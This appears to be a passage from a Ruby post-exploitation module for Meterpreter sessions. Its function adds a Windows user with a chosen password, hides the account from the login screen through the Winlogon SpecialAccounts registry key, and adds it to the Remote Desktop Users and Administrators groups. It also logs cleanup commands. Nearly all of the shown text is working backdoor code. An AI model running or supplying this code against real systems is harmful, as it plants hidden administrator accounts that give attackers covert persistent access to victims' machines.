...
def addrdpusr(session, username, password)
  ...
  begin
    ...
    # addusr_out = cmd_exec(cmd_path, "/c chcp 65001")
    # print_status(addusr_out)
    # addusr_out = cmd_exec(cmd_path, "/c chcp 65001 & dir c:")
    print_status(cmd_path)
    addusr_out = cmd_exec("#{cmd_path}", "/c chcp 65001 & net user #{username} #{password} /add")
    print_status(addusr_out)
    if addusr_out =~ /success/i
      cmd_path_tmp = cmd_path.gsub("\\", "\\\\\\")
      file_local_write(@dest,"execute -H -f #{cmd_path_tmp} -a \"/c net user #{username} /delete\"")
      print_status "\tHiding user from Windows Login screen"
      hide_user_key = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
      registry_setvaldata(hide_user_key,username,0,"REG_DWORD")
      file_local_write(@dest,"execute -H -f #{cmd_path_tmp} -a '/c reg delete \"#{hide_user_key}\" /f /v #{username}'")
      print_status "\tAdding User: #{username} to local group '#{rdu}'"
      cmd_exec("#{cmd_path}","/c net localgroup \"#{rdu}\" #{username} /add")

      print_status "\tAdding User: #{username} to local group '#{admin}'"
      cmd_exec("#{cmd_path}","/c net localgroup #{admin}  #{username} /add")
